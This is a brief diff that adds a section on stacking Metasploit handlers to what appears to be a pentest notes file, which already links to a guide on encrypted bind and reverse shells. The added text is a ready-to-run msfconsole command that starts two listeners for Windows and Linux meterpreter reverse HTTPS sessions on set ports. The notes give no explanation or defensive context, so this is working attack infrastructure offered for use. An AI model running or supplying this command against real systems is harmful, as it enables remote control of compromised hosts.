@@ -19,3 +19,7 @@ support Python greater than 3.11.
 # Shell Generators:
 
 https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/
+
+# msfconsole Handler Stacking
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 10.0.0.190; set LPORT 8443; set ExitOnSession false; exploit -j;use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.0.0.190; set LPORT 8843; set ExitOnSession false; exploit -j"
+
